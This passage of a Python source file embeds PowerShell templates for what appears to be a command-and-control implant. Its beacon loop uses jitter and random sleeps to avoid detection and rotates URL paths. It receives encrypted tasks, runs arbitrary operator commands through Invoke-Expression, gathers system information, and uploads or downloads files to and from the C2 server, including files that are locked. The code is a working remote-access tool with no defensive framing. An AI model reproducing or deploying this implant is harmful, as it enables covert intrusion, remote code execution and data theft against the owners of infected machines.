            Write-Host "Skipping duplicate command: $commandType at $timestamp (already processed)"
            continue
        }
        
        # Execute based on command type
        try {
            $result = ""
            
            # Check for server public key in the first contact
            if ($commandType -eq "server_public_key") {
                # Process the server's public key and start key exchange
                $keySetupSuccess = Process-ServerPublicKey -PublicKeyBase64 $args
                $result = if ($keySetupSuccess) { 
                    "Server public key imported and client key registered successfully" 
                } else { 
                    "Failed to complete secure key exchange" 
                }
                
                # Send result back to server immediately
                Send-CommandResult -Timestamp $timestamp -Result $result
                
                # Track this command as processed
                $global:processedCommandIds[$commandId] = $true
                
                # Continue to next command
                continue
            }
            # Handle key issuance and rotation commands as fallback
            elseif ($commandType -eq "key_issuance") {
                # Only process if key registration failed or is still pending
                if ($global:keyRegistrationStatus -ne "success" -or $null -eq $global:encryptionKey) {
                    # Initial key setup from server (fallback method)
                    $success = Update-EncryptionKey -Base64Key $args
                    $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
                } else {
                    $result = "Client using self-generated key, server key ignored"
                }
                
                # Send the result back to C2 using a random path
                $resultObj = @{
                    timestamp = $timestamp
                    result = $result
                }
                
                # First prepare the JSON
                $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                
                # Create a web client for result submission
                $resultClient = New-WebClient
    
                # Try to send the result - with retry mechanism
                $maxRetries = 3
                $currentRetry = 0
                $sendSuccess = $false
                
                while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
                    try {
                        # Use Send-CommandResult if we have a successful key setup
                        if ($success) {
                            Send-CommandResult -Timestamp $timestamp -Result $result
                            $sendSuccess = $true
                        }
                        else {
                            # If key setup failed, try with unencrypted data on first attempt
                            $resultUrl = "http://$serverAddress$(Get-RandomPath)"
                            
                            if ($currentRetry -eq 0) {
                                $resultClient.UploadString($resultUrl, $resultJson)
                            }
                            # On subsequent retries, try with basic encryption
                            else {
                                $operationPayload = @{
                                    "op_type" = "result"
                                    "payload" = $resultObj
                                }
                                
                                $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
                                $encryptedResult = Encrypt-Data -PlainText $operationJson
                                
                                $encryptedObj = @{
                                    d = $encryptedResult  # Shortened from 'data'
                                    t = Get-RandomToken    # Shortened from 'token'
                                    c = $global:clientID   # Shortened from 'client_id', only for first contact
                                }
                                
                                $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                                $resultClient.UploadString($resultUrl, $encryptedJson)
                            }
                            
                            $sendSuccess = $true
                        }
                        
                        Write-Host "Key issuance result sent successfully"
                    }
                    catch {
                        $currentRetry++
                        Write-Host "Error sending key issuance result (attempt $currentRetry): $_"
                        Start-Sleep -Seconds 1  # Brief pause before retry
                    }
                }
                
                # Track this command as processed
                $global:processedCommandIds[$commandId] = $true
                
                # Continue to the next command
                continue
            }
            elseif ($commandType -eq "key_rotation") {
                # Only process if key registration failed or is still pending
                if ($global:keyRegistrationStatus -ne "success" -or $null -eq $global:encryptionKey) {
                    # Handle key rotation command from operator
                    $success = Update-EncryptionKey -Base64Key $args
                    $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
                } else {
                    $result = "Client using self-generated key, rotation ignored"
                }
            }
            elseif ($commandType -eq "system_info_request") {
                # Now that we have secure channel, send full system info
                $systemInfo = Get-SystemIdentification
                $systemInfoJson = ConvertTo-Json -InputObject $systemInfo -Compress
                $result = $systemInfoJson
                $global:systemInfoSent = $true
                Write-Host "System information sent after secure channel established"
            }
            elseif ($commandType -eq "execute") {
                # Execute shell command
                try {
                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
                    Write-Host "Executing command: $args"
                    $result = Invoke-Expression -Command $args | Out-String
                    Write-Host "Command execution completed"
                }
                catch {
                    $result = "Error executing command: $_"
                    Write-Host $result
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    
                    # Create a new hashtable manually from the paths object
                    $newPaths = @{}
                    $rotationArgs.paths | Get-Member -MemberType NoteProperty | ForEach-Object {
                        $name = $_.Name
                        $value = $rotationArgs.paths.$name
                        $newPaths[$name] = $value
                    }
                    
                    # Now update with properly constructed hashtable
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $newPaths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                    Write-Host $result
                }
                catch {
                    $result = "Path rotation failed: $_"
                    Write-Host $result
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2 using a random path
            Send-CommandResult -Timestamp $timestamp -Result $result
            
            # Track this command as processed
            $global:processedCommandIds[$commandId] = $true
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
            }
            
            try {
                Send-CommandResult -Timestamp $timestamp -Result "Error executing command: $_"
                # Track this command as processed even if it resulted in an error
                $global:processedCommandIds[$commandId] = $true
            }
            catch {
                Write-Host "Error sending command error result: $_"
            }
        }
    }
}

# Function to perform a random sleep within configured limits
function Start-RandomSleep {
    # Generate a random sleep time between 1 and maxSleepTime seconds
    if ($maxSleepTime -gt 1) {
        $sleepDuration = Get-Random -Minimum 1 -Maximum $maxSleepTime
        Write-Host "Performing random sleep for $sleepDuration seconds"
        Start-Sleep -Seconds $sleepDuration
        return $true
    }
    return $false
}

# Main agent loop
function Start-AgentLoop {
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Only perform random sleep if enabled (config controlled)
            if ($randomSleepEnabled) {
                # Randomly sleep before operations to further avoid detection
                Start-RandomSleep | Out-Null
            }
            
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            Write-Host "Using beacon interval: $actualInterval seconds (base: $beaconInterval, jitter: $jitterPercentage%)"
            
            # Prepare system info data
            $systemInfo = Get-SystemIdentification
            
            # Send beacon with random path selection
            try {
                $response = Send-Beacon -SystemInfo $systemInfo -UseRandomPath $true
                
                # Reset failure counter on successful connection
                $consecutiveFailures = 0
                $usingFallbackPaths = $false
                
                # Process response data
                $responseObject = ConvertFrom-Json -InputObject $response
                
                # Extract special fields
                $firstContact = $responseObject.f  # 'f' is shortened from 'first_contact'
                $clientId = $responseObject.c      # 'c' is shortened from 'client_id'
                
                # Check for special flags
                if ($clientId -and $global:firstContact) {
                    $global:clientID = $clientId
                    Write-Host "Server assigned client ID: $clientId"
                }
                
                # Check for the server's public key in the response
                if ($firstContact -and $responseObject.pubkey) {
                    Write-Host "Received server's public key"
                    
                    # Add a special command to process the server's public key
                    $serverPublicKeyCommand = @{
                        timestamp = [DateTime]::Now.ToString("yyyy-MM-dd HH:mm:ss")
                        command_type = "server_public_key"
                        args = $responseObject.pubkey
                    }
                    
                    # Process this command first
                    $commands = @($serverPublicKeyCommand)
                    Process-Commands -Commands $commands
                }
                
                # Check for rotation info
                if ($responseObject.r) {
                    $rotationInfo = $responseObject.r
                    if ($rotationInfo.cid -and $rotationInfo.nrt) {
                        $global:currentRotationId = $rotationInfo.cid
                        $global:nextRotationTime = $rotationInfo.nrt
                        Write-Host "Updated rotation info - ID: $($rotationInfo.cid), Next rotation: $([DateTimeOffset]::FromUnixTimeSeconds($rotationInfo.nrt).DateTime)"
                    }
                }
                
                # Process response if it contains commands
                if ($responseObject.com -and ($responseObject.com.Length -gt 0 -or $responseObject.e -eq $true)) {
                    # Extract and decrypt commands
                    $commands = $null
                    
                    if ($responseObject.e -eq $true) {  # 'e' is shortened from 'encrypted'
                        # Commands are encrypted, decrypt first
                        $decryptedCommands = Decrypt-Data -EncryptedBase64 $responseObject.com
                        try {
                            $commands = ConvertFrom-Json -InputObject $decryptedCommands
                        }
                        catch {
                            Write-Host "Error parsing decrypted commands: $_"
                        }
                    }
                    else {
                        # Commands are not encrypted (first contact scenario)
                        $commands = $responseObject.com
                    }
                    
                    # Process commands if available
                    if ($commands) {
                        Process-Commands -Commands $commands
                    }
                }
            }
            catch {
                $errorMsg = $_.Exception.Message
                Write-Host "Error in beacon: $errorMsg"
                
                # Increment failure counter
                $consecutiveFailures++
                
                # If too many failures, increase the beacon interval temporarily
                if ($consecutiveFailures -gt $maxFailuresBeforeFallback) {
                    # Exponential backoff with max of the configured max backoff time
                    $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback) + 2))
                    Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                    Start-Sleep -Seconds $backoffSeconds
                    continue
                }
            }
        }
        catch {
            Write-Host "Critical error in agent loop: $_"
            # Try to recover with a brief pause
            Start-Sleep -Seconds 5
        }
        
        # Wait for next beacon interval
        Write-Host "Sleeping for $actualInterval seconds until next beacon"
        Start-Sleep -Seconds $actualInterval
    }
}

# Start the agent
Start-AgentLoop
"""

    @classmethod
    def _get_path_rotation_template(cls) -> str:
        """
        Return the embedded path rotation template
        
        Returns:
            PowerShell path rotation template code
        """
        return """# Path rotation configuration
$global:pathRotationEnabled = $true
$global:currentRotationId = {{ROTATION_ID}}
$global:nextRotationTime = {{NEXT_ROTATION_TIME}}
$global:rotationInterval = {{ROTATION_INTERVAL}}

# Store the path pool for modular operation
$global:pathPool = @()

# Track which paths have been used and how many times
$global:pathUsageTracking = @{}

# Function to handle path rotation updates from server
function Update-PathRotation {
    param(
        [int]$RotationId,
        [int]$NextRotationTime,
        [hashtable]$Paths
    )
    
    $global:currentRotationId = $RotationId
    $global:nextRotationTime = $NextRotationTime
    
    # Update paths if provided
    if ($Paths -and $Paths.Count -gt 0) {
        $global:pathPool = @()
        $global:pathUsageTracking = @{} # Reset usage tracking on rotation
        
        # Store the path pool for random selection
        if ($Paths.ContainsKey("path_pool")) {
            if ($Paths["path_pool"] -is [array]) {
                $global:pathPool = $Paths["path_pool"]
                Write-Host "Updated path pool with $($global:pathPool.Count) paths"
                
                # Initialize usage tracking for each path
                foreach ($path in $global:pathPool) {
                    $global:pathUsageTracking[$path] = 0
                }
            }
            else {
                Write-Host "Warning: path_pool is not an array, skipping"
            }
        }
    }
    
    # Log the rotation
    $nextTime = [DateTimeOffset]::FromUnixTimeSeconds($NextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Host "Path rotation updated: ID $RotationId, next rotation at $nextTime"
}

# Function to get a random path from the pool with improved selection logic
function Get-RandomPath {
    [CmdletBinding()]
    param(
        [switch]$ForceRandom = $false,
        [switch]$PreferUnused = $true,
        [switch]$ForFileOperation = $false
    )
    
    # Check if we have a path pool to use
    if (-not $global:pathPool -or $global:pathPool.Count -eq 0) {
        # If no path pool available, return a fallback path
        Write-Verbose "No path pool available, using fallback path"
        return "/api/endpoint"
    }
    
    # If looking for a file operation path, try to select one that matches
    if ($ForFileOperation) {
        $fileOpPaths = $global:pathPool | Where-Object { $_ -match "/file/" -or $_ -match "/download/" -or $_ -match "/content/" }
        if ($fileOpPaths -and $fileOpPaths.Count -gt 0) {
            # Use one of these paths
            $randomIndex = Get-Random -Minimum 0 -Maximum $fileOpPaths.Count
            $path = $fileOpPaths[$randomIndex]
            Write-Verbose "Selected file operation path: $path"
            
            # Update usage tracking
            if (-not $global:pathUsageTracking.ContainsKey($path)) {
                $global:pathUsageTracking[$path] = 0
            }
            $global:pathUsageTracking[$path]++
            
            return $path
        }
    }
    
    # If we need completely random selection, bypass usage tracking
    if ($ForceRandom) {
        $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
        $path = $global:pathPool[$randomIndex]
        Write-Verbose "Forced random path selection: $path"
        
        # Still update usage stats
        if (-not $global:pathUsageTracking.ContainsKey($path)) {
            $global:pathUsageTracking[$path] = 0
        }
        $global:pathUsageTracking[$path]++
        
        return $path
    }
    
    # Prefer least used paths
    if ($PreferUnused) {
        # Find the paths that have been used the least
        $minUsage = [int]::MaxValue
        $leastUsedPaths = @()
        
        # Initialize usage count for any new paths
        foreach ($path in $global:pathPool) {
            if (-not $global:pathUsageTracking.ContainsKey($path)) {
                $global:pathUsageTracking[$path] = 0
            }
            
            # Track min usage count
            if ($global:pathUsageTracking[$path] -lt $minUsage) {
                $minUsage = $global:pathUsageTracking[$path]
                $leastUsedPaths = @($path)
            }
            elseif ($global:pathUsageTracking[$path] -eq $minUsage) {
                $leastUsedPaths += $path
            }
        }
        
        # Pick randomly from the least used paths
        $selectedPath = $leastUsedPaths[$(Get-Random -Minimum 0 -Maximum $leastUsedPaths.Count)]
        $global:pathUsageTracking[$selectedPath]++
        
        Write-Verbose "Selected least used path: $selectedPath (usage count: $($global:pathUsageTracking[$selectedPath]))"
        return $selectedPath
    }
    
    # Default behavior: weighted random selection based on usage counts
    $totalWeight = $global:pathPool.Count
    $weights = @{}
    
    foreach ($path in $global:pathPool) {
        if (-not $global:pathUsageTracking.ContainsKey($path)) {
            $global:pathUsageTracking[$path] = 0
        }
        
        # Inverse weight - less used paths get higher weights
        $weight = $totalWeight - $global:pathUsageTracking[$path]
        if ($weight -lt 1) { $weight = 1 } # Ensure minimum weight of 1
        $weights[$path] = $weight
    }
    
    # Calculate total weight
    $totalWeight = 0
    foreach ($weight in $weights.Values) {
        $totalWeight += $weight
    }
    
    # Select path based on weights
    $randomValue = Get-Random -Minimum 1 -Maximum ($totalWeight + 1)
    $cumulativeWeight = 0
    
    foreach ($path in $weights.Keys) {
        $cumulativeWeight += $weights[$path]
        if ($randomValue -le $cumulativeWeight) {
            # Update usage count for the selected path
            $global:pathUsageTracking[$path]++
            Write-Verbose "Selected weighted path: $path (usage count: $($global:pathUsageTracking[$path]))"
            return $path
        }
    }
    
    # Fallback if something went wrong with weighted selection
    $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
    $path = $global:pathPool[$randomIndex]
    $global:pathUsageTracking[$path]++
    Write-Verbose "Fallback random path selection: $path"
    return $path
}

# Function to check if rotation is needed
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        Write-Host "Rotation time reached, waiting for update from server..."
        return $true
    }
    
    return $false
}"""

    @classmethod
    def _get_file_operations_template(cls) -> str:
        """
        Return the embedded file operations template
        
        Returns:
            PowerShell file operations template code
        """
        return r"""# File Operations Module for Kinetic Compliance Matrix Agent
    # This module provides functions for file system navigation, upload, and download

function Get-DirectoryListing {
    <#
    .SYNOPSIS
        Gets directory listing with better formatting for C2 interface
    .DESCRIPTION
        Lists files and folders in the specified directory with detailed information
    .PARAMETER DirectoryPath
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    
    try {
        # Expand environment variables if present
        if ($DirectoryPath -match '%\w+%') {
            $DirectoryPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
        }
        
        # Log the expanded path
        Write-Host "Listing directory: $DirectoryPath"
        
        # Check if directory exists
        if (-not (Test-Path -Path $DirectoryPath -PathType Container)) {
            return "Error: Directory not found: $DirectoryPath"
        }
        
        # Get items with error handling
        try {
            $items = Get-ChildItem -Path $DirectoryPath -Force -ErrorAction Stop | 
            Select-Object Name, Length, LastWriteTime, Attributes, @{
                Name = "Type";
                Expression = {
                    if ($_.PSIsContainer) { "Directory" } else { "File" }
                }
            }
            
            # Convert to JSON for structured display in C2 interface
            $jsonResult = ConvertTo-Json -InputObject $items -Compress -Depth 2
            # Log first 100 chars of result
            Write-Host "Listing result (first 100 chars): $($jsonResult.Substring(0, [Math]::Min(100, $jsonResult.Length)))"
            return $jsonResult
        }
        catch {
            # Try a simpler approach if the first method fails
            Write-Host "Standard method failed, trying alternative approach: $_"
            $result = @()
            
            # Manually create directory entries
            foreach ($item in (Get-ChildItem -Path $DirectoryPath -Force -ErrorAction SilentlyContinue)) {
                $type = if ($item.PSIsContainer) { "Directory" } else { "File" }
                $size = if ($item.PSIsContainer) { 0 } else { $item.Length }
                
                $entry = @{
                    "Name" = $item.Name
                    "Type" = $type
                    "Length" = $size
                    "LastWriteTime" = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                    "Attributes" = $item.Attributes.ToString()
                }
                $result += $entry
            }
            
            # Convert to JSON and return
            $jsonResult = ConvertTo-Json -InputObject $result -Compress -Depth 2
            return $jsonResult
        }
    }
    catch {
        Write-Host "Error listing directory: $_"
        return "Error listing directory: $_"
    }
}

# Function to configure a web client with proper settings
function New-ConfiguredWebClient {
    $webClient = New-Object System.Net.WebClient
    
    # Set User-Agent
    $webClient.Headers.Add("User-Agent", $userAgent)
    
    # Set proxy if enabled
    if ($proxyEnabled -and $global:proxyInstance) {
        $webClient.Proxy = $global:proxyInstance
    }
    
    # Add authentication credentials if configured
    if ($useCredentials) {
        $credentials = New-Object System.Net.NetworkCredential($username, $password)
        $webClient.Credentials = $credentials
    }
    
    return $webClient
}

function Upload-File {
    <#
    .SYNOPSIS
        Uploads a file from server to client
    .DESCRIPTION
        Downloads a file from the C2 server and saves it to the specified path on the client
    .PARAMETER SourcePath
        Path to the file on the server
    .PARAMETER DestinationPath
        Path where the file should be saved on the client
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )
    
    try {
        # Expand environment variables if present in destination path
        if ($DestinationPath -match '%\w+%') {
            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
            Write-Host "Expanded destination path: $DestinationPath"
        }
        
        # Make sure the destination path ends with a filename, not just a directory
        if ($DestinationPath.EndsWith('\') -or $DestinationPath.EndsWith('/')) {
            # If only a directory was provided, append the source filename
            $filename = if ($SourcePath -match '[\\/]([^\\/]+)$') {
                # Extract filename from source path
                $matches[1]
            } else {
                # Use source path as filename if it doesn't contain path separators
                $SourcePath
            }
            
            # Append filename to destination path
            $DestinationPath = Join-Path -Path $DestinationPath -ChildPath $filename
            Write-Host "Appended filename to destination path: $DestinationPath"
        }
        
        # Create destination directory if it doesn't exist
        $destinationDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
        if (-not (Test-Path -Path $destinationDir -PathType Container)) {
            Write-Host "Creating directory: $destinationDir"
            try {
                New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            }
            catch {
                Write-Host "Error creating directory: $_"
                # If we can't create the directory, try a fallback location
                $tempFolder = [System.IO.Path]::GetTempPath()
                $filename = [System.IO.Path]::GetFileName($DestinationPath)
                $DestinationPath = Join-Path -Path $tempFolder -ChildPath $filename
                Write-Host "Using fallback destination: $DestinationPath"
            }
        }
        
        # Create file request JSON
        $fileRequest = @{
            FilePath = $SourcePath
            Destination = $DestinationPath
        }

        # Convert to JSON
        $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
        Write-Host "Request JSON: $requestJson"
        
        # Get a random path for file operation
        $filePath = Get-RandomPath -ForFileOperation
        Write-Host "Using random file operation path: $filePath"
        
        # Encrypt the request
        $encryptedRequest = Encrypt-Data -PlainText $requestJson
        
        # Prepare the payload with proper JSON structure
        $payload = @{
            d = $encryptedRequest  # Shortened from 'data'
            t = Get-RandomToken     # Shortened from 'token'
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        # Convert payload to JSON with proper handling
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
        
        # Create a web client
        $webClient = New-Object System.Net.WebClient
        
        # Set User-Agent
        $webClient.Headers.Add("User-Agent", $userAgent)
        
        # Set proxy if enabled
        if ($proxyEnabled -and $global:proxyInstance) {
            $webClient.Proxy = $global:proxyInstance
        }
        
        # Add authentication credentials if configured
        if ($useCredentials) {
            $credentials = New-Object System.Net.NetworkCredential($username, $password)
            $webClient.Credentials = $credentials
        }
        
        # Explicitly set content type
        $webClient.Headers.Add("Content-Type", "application/json")
        
        # Send the request
        $requestUrl = "http://$serverAddress$filePath"
        Write-Host "Sending file request to $requestUrl"
        
        # ===== ERROR HANDLING AND DEBUG CODE =====
        try {
            # Send the request
            $response = $webClient.UploadString($requestUrl, $payloadJson)
            
            # Debug the response 
            Write-Host "DEBUG: Response length: $($response.Length) chars"
            Write-Host "DEBUG: Response preview: $($response.Substring(0, [Math]::Min(50, $response.Length)))"
            
            # Parse and decrypt the response
            try {
                $responseObj = $null
                
                # Check if response is valid JSON by trying to parse it
                $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                
                # Process based on presence of 'd' field
                if ($responseObj.PSObject.Properties.Name -contains 'd') {
                    $encryptedData = $responseObj.d
                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
                }
                else {
                    # Try direct decryption as fallback
                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
                }
                
                # Try to parse the decrypted response as JSON
                $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                
                # Check if file was found
                if ($fileResponse.Status -eq "Error") {
                    return "Error: $($fileResponse.Message)"
                }
                
                # Get file content and save it
                $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
                
                # Write bytes to file with error handling
                try {
                    # Write file with proper path verification
                    Write-Host "Writing to file: $DestinationPath"
                    
                    # Create parent directory if needed
                    $parentDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
                    if (-not [string]::IsNullOrEmpty($parentDir) -and -not (Test-Path -Path $parentDir -PathType Container)) {
                        Write-Host "Creating parent directory: $parentDir"
                        New-Item -Path $parentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
                    }
                    
                    # Write the file
                    [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                    Write-Host "File successfully written to $DestinationPath"
                }
                catch [System.UnauthorizedAccessException] {
                    # Permission issue - fall back to temp
                    Write-Host "Permission denied, falling back to temp folder"
                    $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
                    Write-Host "New path: $newPath"
                    [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                    $DestinationPath = $newPath
                    Write-Host "File successfully written to $DestinationPath"
                }
                catch [System.IO.DirectoryNotFoundException] {
                    # Directory not found - create it or fall back to temp
                    Write-Host "Directory not found, attempting to create it"
                    try {
                        $dirPath = [System.IO.Path]::GetDirectoryName($DestinationPath)
                        New-Item -Path $dirPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
                        [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                        Write-Host "File successfully written after creating directory: $DestinationPath"
                    }
                    catch {
                        # Fall back to temp directory
                        Write-Host "Failed to create directory, falling back to temp folder"
                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                        $DestinationPath = $newPath
                        Write-Host "File successfully written to $DestinationPath"
                    }
                }
                catch {
                    # General error - try alternative method with stream
                    Write-Host "Error writing file, trying alternate method: $_" 
                    try {
                        # Try to use FileStream instead
                        $fileStream = New-Object System.IO.FileStream($DestinationPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
                        $fileStream.Write($fileContent, 0, $fileContent.Length)
                        $fileStream.Close()
                        $fileStream.Dispose()
                        Write-Host "File successfully written using FileStream: $DestinationPath"
                    }
                    catch {
                        # Fall back to temp directory as last resort
                        Write-Host "All write attempts failed, falling back to temp folder: $_"
                        $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath) -replace '[^\w\.-]', '_')
                        [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                        $DestinationPath = $newPath
                        Write-Host "File successfully written to $DestinationPath"
                    }
                }
                
                return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
            }
            catch {
                Write-Host "Error processing server response: $_"
                return "Error processing server response: $_"
            }
        }
        catch {
            Write-Host "Error processing server response: $_"
            return "Error downloading file from server: $_"
        }
    }
    catch {
        Write-Host "Error in file upload process: $_"
        return "Error uploading file: $_"
    }
}

# Function to upload a file from the client to the server
function Download-File {
    <#
    .SYNOPSIS
        Uploads a file from the client to the server
    .DESCRIPTION
        Sends a file from the client to the C2 server
    .PARAMETER FilePath
        Path to the file on the client to upload
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    try {
        # Expand environment variables if present in source path
        if ($FilePath -match '%\w+%') {
            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
        }
        
        # Check if file exists
        if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
            return "Error: File not found: $FilePath"
        }
        
        # Try to read file with proper error handling for locked files
        $fileBytes = $null
        try {
            # First attempt: standard read
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        }
        catch [System.IO.IOException] {
            Write-Host "File is in use, trying alternative read method"
            try {
                # Second attempt: Open with FileShare.ReadWrite to allow reading even if file is in use
                $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                $memStream = New-Object System.IO.MemoryStream
                $fileStream.CopyTo($memStream)
                $fileBytes = $memStream.ToArray()
                $fileStream.Close()
                $memStream.Close()
            }
            catch {
                # Third attempt: try to make a copy of the file first
                Write-Host "Alternative read failed, trying to make a copy first"
                $tempFile = [System.IO.Path]::GetTempFileName()
                Copy-Item -Path $FilePath -Destination $tempFile -Force
                $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
                Remove-Item -Path $tempFile -Force
            }
        }
        
        # If we still couldn't read the file, return an error
        if ($null -eq $fileBytes) {
            return "Error: Could not read file content - file may be locked or in use"
        }
        
        # Convert to base64
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        
        # Prepare file upload data
        $fileData = @{
            FileName = (Split-Path -Path $FilePath -Leaf)
            FileContent = $fileContent
            FileSize = $fileBytes.Length
            SourcePath = $FilePath
            Description = "File uploaded from client"
        }
        
        # Create the operation payload
        $operationPayload = @{
            "op_type" = "file_up"    # Must be file_up for client->server transfer
            "payload" = $fileData
        }
        
        # Convert to JSON
        $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
        
        # Encrypt the data
        $encryptedData = Encrypt-Data -PlainText $operationJson
        
        # Create web client
        $webClient = New-WebClient
        
        # Prepare the payload
        $payload = @{
            d = $encryptedData        # Data field
            t = Get-RandomToken       # Token padding
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress
        
        # Get a random path for file operation
        $uploadPath = Get-RandomPath -ForFileOperation
        Write-Host "Using random file operation path: $uploadPath"
        
        # Construct the upload URL with validated server address
        if ([string]::IsNullOrEmpty($global:serverAddress) -or $global:serverAddress -eq "/" -or $global:serverAddress -eq "//") {
            Write-Host "Warning: Server address is empty or invalid. Setting to localhost."
            $global:serverAddress = "localhost"
        }
        
        # Remove any trailing slashes to prevent URL formatting issues
        if ($global:serverAddress.EndsWith("/")) {
            $global:serverAddress = $global:serverAddress.TrimEnd('/')
            Write-Host "Removed trailing slash from server address: $global:serverAddress"
        }
        
        # Construct the upload URL
        $uploadUrl = "http://$($global:serverAddress)$uploadPath"
        Write-Host "Sending file upload to $uploadUrl"
        
        # Debug information to help diagnose URL issues
        Write-Host "Server address: $($global:serverAddress)"
        Write-Host "Upload path: $uploadPath"
        Write-Host "File size: $($fileBytes.Length) bytes"
        
        try {
            $response = $webClient.UploadString($uploadUrl, $payloadJson)
            
            # Parse and process the response if present
            if ($response -and $response.StartsWith('{')) {
                try {
                    $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
                    
                    if ($responseObj.d) {
                        # Decrypt the response
                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObj.d
                        $responseData = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                        
                        if ($responseData.Status -eq "Success") {
                            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes): $($responseData.Message)"
                        }
                        else {
                            return "Upload completed with status: $($responseData.Status) - $($responseData.Message)"
                        }
                    }
                }
                catch {
                    Write-Host "Error processing response: $_"
                }
            }
            
            # If we couldn't parse the response or there was no structured response
            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes)"
        }
        catch {
            Write-Host "Error sending file upload: $_"
            return "Error uploading file: $_"
        }
    }
    catch {
        Write-Host "Error in file upload operation: $_"
        return "Error uploading file: $_"
    }
}

# Other utility functions remain unchanged

function Get-DriveInfo {
    <#
    .SYNOPSIS
        Gets information about available drives
    .DESCRIPTION
        Returns detailed information about all available drives
    #>
    try {
        $drives = Get-CimInstance -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
            [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Fixed"
                SizeGB = [math]::Round($_.Size / 1GB, 2)
                FreeSpaceGB = [math]::Round($_.FreeSpace / 1GB, 2)
                PercentFree = [math]::Round(($_.FreeSpace / $_.Size) * 100, 2)
            }
        }
        
        # Add removable drives
